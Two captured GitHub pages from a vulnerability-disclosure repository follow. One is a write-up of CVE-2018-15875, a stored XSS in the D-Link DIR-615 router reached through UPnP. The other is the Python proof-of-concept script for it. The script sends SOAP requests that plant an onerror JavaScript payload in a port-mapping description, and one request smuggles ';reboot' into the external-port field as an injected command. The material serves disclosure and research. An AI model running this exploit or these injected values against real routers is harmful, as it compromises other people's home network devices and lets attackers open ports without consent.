=== Content from github.com_5f20a56e_20250124_234339.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freevesrs24%2Fcve%2Fblob%2Fmaster%2FD-Link_DIR-615%2Fxss_UPnP%2Fdlink_dir615_xss_upnp.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freevesrs24%2Fcve%2Fblob%2Fmaster%2FD-Link_DIR-615%2Fxss_UPnP%2Fdlink_dir615_xss_upnp.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=reevesrs24%2FCVE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[reevesrs24](/reevesrs24)
/
**[CVE](/reevesrs24/CVE)**
Public

* [Notifications](/login?return_to=%2Freevesrs24%2FCVE) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Freevesrs24%2FCVE)
* [Star
   8](/login?return_to=%2Freevesrs24%2FCVE)

* [Code](/reevesrs24/CVE)
* [Issues
  1](/reevesrs24/CVE/issues)
* [Pull requests
  0](/reevesrs24/CVE/pulls)
* [Actions](/reevesrs24/CVE/actions)
* [Projects
  0](/reevesrs24/CVE/projects)
* [Security](/reevesrs24/CVE/security)
* [Insights](/reevesrs24/CVE/pulse)

Additional navigation options

* [Code](/reevesrs24/CVE)
* [Issues](/reevesrs24/CVE/issues)
* [Pull requests](/reevesrs24/CVE/pulls)
* [Actions](/reevesrs24/CVE/actions)
* [Projects](/reevesrs24/CVE/projects)
* [Security](/reevesrs24/CVE/security)
* [Insights](/reevesrs24/CVE/pulse)

## Files

 master
## Breadcrumbs

1. [CVE](/reevesrs24/CVE/tree/master)
2. /[D-Link\_DIR-615](/reevesrs24/CVE/tree/master/D-Link_DIR-615)
3. /[xss\_UPnP](/reevesrs24/CVE/tree/master/D-Link_DIR-615/xss_UPnP)
/
# dlink\_dir615\_xss\_upnp.md

Copy path Blame  Blame
## Latest commit

## History

[History](/reevesrs24/CVE/commits/master/D-Link_DIR-615/xss_UPnP/dlink_dir615_xss_upnp.md)49 lines (39 loc) · 2.21 KB master
## Breadcrumbs

1. [CVE](/reevesrs24/CVE/tree/master)
2. /[D-Link\_DIR-615](/reevesrs24/CVE/tree/master/D-Link_DIR-615)
3. /[xss\_UPnP](/reevesrs24/CVE/tree/master/D-Link_DIR-615/xss_UPnP)
/
# dlink\_dir615\_xss\_upnp.md

Top
## File metadata and controls

* Preview
* Code
* Blame

49 lines (39 loc) · 2.21 KB[Raw](https://github.com/reevesrs24/cve/raw/refs/heads/master/D-Link_DIR-615/xss_UPnP/dlink_dir615_xss_upnp.md)
# D-Link DIR-615 XSS Via the UPnP Protocol

**Vendor**：D-Link

**Product**: DIR-615

**Version**: 20.07

**Hardware Version**: T1

**Vendor Homepage**: <http://us.dlink.com/>

**CVE**: [CVE-2018-15875](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15875)

**NVD**: [CVE-2018-15875](https://nvd.nist.gov/vuln/detail/CVE-2018-15875)

## Vulnerability detail

Verification Steps:

1. Connect to the D-Link DIR-615 router.
2. Run the [xss\_upnp.py](https://github.com/reevesrs24/cve/tree/master/D-Link_DIR-615/xss_UPnP/xss_upnp.py) script with the -d switch to start the UPnP "Simple Search Discovery Process".
   to retrieve the "upnp:rootdevice" uuid.
3. Two results should be displayed to the terminal http://192.168.0.1:5431/igdevicedesc.xml and http:///192.168.0.1:54217/simplecfg.xml.
4. Navigate to http:///192.168.0.1:5431/igdevicedesc.xml to retrieve the UPnP control url
   * **Note:** The port number and xml file may vary depending on the router, look for the "urn:schemas-upnp-org:service:WANIPConnection:1"
     xml element to find the control url.
     [![alt text](/reevesrs24/CVE/raw/master/D-Link_DIR-615/xss_UPnP/screenshots/control_url.png)](/reevesrs24/CVE/blob/master/D-Link_DIR-615/xss_UPnP/screenshots/control_url.png)
5. Set the 'url' variable in the xss\_upnp.py script to the control-url.
   * e.g. http:///192.168.0.1:5431/control/WANIPConnection
6. Set the "NewPortMappingDescription" field in the "add\_port\_mapping" function to an HTML element where the attribute is javascript.
   * e.g.
   ```
   <img src="" onerror=alert("XSS") />
   ```

   (The <script> tag caused the page to fail to load, but adding javascript to an attribute worked)
7. Run the xss\_upnp.py script with the -m switch to add the port mapping.
   * If successful the router should return an xml acknowledgement similar to this
   ```
      <?xml version="1.0"?><br/>
        <s:Envelope xmlns:s="http:/<span></span>//schemas.xmlsoap.org/soap/envelope/"><br/>
            <s:Body><br/>
                <u:AddPortMappingResponse xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><br/>
                </u:AddPortMappingResponse><br/>
            </s:Body><br/>
        </s:Envelope>
   ```
8. Navigate to the router's Advanced->UPnP page to verify the xss.
   [![alt text](/reevesrs24/CVE/raw/master/D-Link_DIR-615/xss_UPnP/screenshots/xss_upnp.png)](/reevesrs24/CVE/blob/master/D-Link_DIR-615/xss_UPnP/screenshots/xss_upnp.png)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e159ca13_20250126_043532.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freevesrs24%2FCVE%2Fblob%2Fmaster%2FD-Link_DIR-615%2Fxss_UPnP%2Fxss_upnp.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freevesrs24%2FCVE%2Fblob%2Fmaster%2FD-Link_DIR-615%2Fxss_UPnP%2Fxss_upnp.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=reevesrs24%2FCVE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[reevesrs24](/reevesrs24)
/
**[CVE](/reevesrs24/CVE)**
Public

* [Notifications](/login?return_to=%2Freevesrs24%2FCVE) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Freevesrs24%2FCVE)
* [Star
   8](/login?return_to=%2Freevesrs24%2FCVE)

* [Code](/reevesrs24/CVE)
* [Issues
  1](/reevesrs24/CVE/issues)
* [Pull requests
  0](/reevesrs24/CVE/pulls)
* [Actions](/reevesrs24/CVE/actions)
* [Projects
  0](/reevesrs24/CVE/projects)
* [Security](/reevesrs24/CVE/security)
* [Insights](/reevesrs24/CVE/pulse)

Additional navigation options

* [Code](/reevesrs24/CVE)
* [Issues](/reevesrs24/CVE/issues)
* [Pull requests](/reevesrs24/CVE/pulls)
* [Actions](/reevesrs24/CVE/actions)
* [Projects](/reevesrs24/CVE/projects)
* [Security](/reevesrs24/CVE/security)
* [Insights](/reevesrs24/CVE/pulse)

## Files

 master
## Breadcrumbs

1. [CVE](/reevesrs24/CVE/tree/master)
2. /[D-Link\_DIR-615](/reevesrs24/CVE/tree/master/D-Link_DIR-615)
3. /[xss\_UPnP](/reevesrs24/CVE/tree/master/D-Link_DIR-615/xss_UPnP)
/
# xss\_upnp.py

Copy path Blame  Blame
## Latest commit

## History

[History](/reevesrs24/CVE/commits/master/D-Link_DIR-615/xss_UPnP/xss_upnp.py)182 lines (137 loc) · 6.08 KB master
## Breadcrumbs

1. [CVE](/reevesrs24/CVE/tree/master)
2. /[D-Link\_DIR-615](/reevesrs24/CVE/tree/master/D-Link_DIR-615)
3. /[xss\_UPnP](/reevesrs24/CVE/tree/master/D-Link_DIR-615/xss_UPnP)
/
# xss\_upnp.py

Top
## File metadata and controls

* Code
* Blame

182 lines (137 loc) · 6.08 KB[Raw](https://github.com/reevesrs24/CVE/raw/refs/heads/master/D-Link_DIR-615/xss_UPnP/xss_upnp.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182#!/usr/bin/env python
import sysimport socketimport getoptimport requestsimport re
## Global Variables ##url = 'http://192.168.0.1:5431/control/WANIPConnection'
def get\_generic\_port\_mapping\_entry():  payload = """<?xml version="1.0" encoding="utf-8"?> <s:Envelope> <s:Body> <u:GetGenericPortMappingEntry xmlns:u="urn:schemas-upnp-org:services:WANIPConnections:1">  <NewPortMappingIndex></NewPortMappingIndex>  </u:GetGenericPortMappingEntry>  </s:Body>  </s:Envelope>"""
 headers = { 'content-type': 'text/xml', 'SOAPAction' : 'urn:schemas-upnp-org:service:WANIPConnection:1#GetGenericPortMappingEntry' } r = requests.post( url, headers=headers, data=payload ) print r.content
def get\_status\_info():
 payload = """<?xml version="1.0" encoding="utf-8"?> <s:Envelope> <s:Body> <u:GetStatusInfo xmlns:u="urn:schemas-upnp-org:services:WANIPConnections:1">  <NewConnectionStatus></NewConnectionStatus>  <NewLastConnectionError></NewLastConnectionError> <NewUptime></NewUptime>  </u:GetStatusInfo>  </s:Body>  </s:Envelope>"""
 headers = { 'content-type': 'text/xml', 'SOAPAction' : 'urn:schemas-upnp-org:service:WANIPConnection:1#GetStatusInfo' } r = requests.post( url, headers=headers, data=payload ) print r.content
def remove\_port\_mapping():
 payload = """<?xml version="1.0" encoding="utf-8"?> <s:Envelope> <s:Body> <u:DeletePortMapping xmlns:u="urn:schemas-upnp-org:services:WANIPConnections:1">  <NewRemoteHost></NewRemoteHost>  <NewExternalPort>;reboot</NewExternalPort> <NewProtocol>TCP</NewProtocol>  </u:DeletePortMapping>  </s:Body>  </s:Envelope>"""
 headers = { 'content-type': 'text/xml', 'SOAPAction' : 'urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping' } r = requests.post( url, headers=headers, data=payload ) print r.content
def get\_external\_ip\_addr():
 payload = """<?xml version="1.0" encoding="utf-8"?> <s:Envelope> <s:Body> <u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:services:WANIPConnections:1">  <NewExternalIPAddress></NewExternalIPAddress>  </u:GetExternalIPAddress>  </s:Body>  </s:Envelope>"""
 headers = { 'content-type': 'text/xml', 'SOAPAction' : 'urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress' } r = requests.post( url, headers=headers, data=payload ) print r.content
def add\_port\_mapping():
 payload = """<?xml version="1.0" encoding="utf-8"?> <s:Envelope> <s:Body> <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:services:WANIPConnections:1">  <NewRemoteHost></NewRemoteHost>  <NewExternalPort>7777</NewExternalPort>  <NewInternalClient>192.168.100.1</NewInternalClient>  <NewInternalPort>7777</NewInternalPort>  <NewProtocol>TCP</NewProtocol>  <NewPortMappingDescription><img src="" onerror=alert("XSS") /></NewPortMappingDescription>  <NewLeaseDuration>0</NewLeaseDuration>  <NewEnabled>1</NewEnabled>  </u:AddPortMapping>  </s:Body>  </s:Envelope>"""
 headers = { 'content-type': 'text/xml', 'SOAPAction' : 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping' } r = requests.post( url, headers=headers, data=payload ) print r.content
def store\_location(data): #print data location = re.search("(?i)Location: (.+?)\r\n", data) if location: print location.group(1)
def ssdp():
 url\_locations = []
 ### UPnP Architecture Specs ### # M-SEARCH - Method for search requests # HOST - Multicast channed and port reserved for SSDP # MAN - Required by HTTP Exension Framework, defines the scope (namespace) of the extension # MX - MAximum wait time in seconds # ST: Required search target, pre defined values SSDP = ('M-SEARCH \* HTTP/1.1\r\n'  'HOST:239.255.255.250:1900\r\n'  'MAN:"ssdp:discover"\r\n'  'MX:10\r\n'  'ST:upnp:rootdevice\r\n' '\r\n')
 s = socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM) s.settimeout(5) s.sendto(SSDP, ('239.255.255.250', 1900) )   print "Discovering..."
 try:
 while 1: data, sokt = s.recvfrom(4096) url\_locations.append( store\_location(data) )
 except socket.timeout: s.close()  if len(url\_locations) == 0: print "Nothing Found!"
 sys.exit(0)
def main():
 # read the command line options try: opts, args = getopt.getopt(sys.argv[1:], "dsqmerisg", ["discover", "set", "quit", "mapping", "external", "remove", "info", "generic"]) except getopt.GetoptError as err: print str(err) sys.exit(-1)
 for o, a in opts: if o in ("-d", "--discover"): ssdp() elif o in ("-q", "--quit"): sys.exit(0) elif o in ("-m", "--mapping"): add\_port\_mapping() elif o in ("-e", "--external"): get\_external\_ip\_addr() elif o in ("-r", "--remove"): remove\_port\_mapping() elif o in ("-i", "--info"): get\_status\_info() elif o in ("-g", "--generic"): get\_generic\_port\_mapping\_entry() else: assert False, "Unhandled Option"
if \_\_name\_\_ == "\_\_main\_\_": main()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


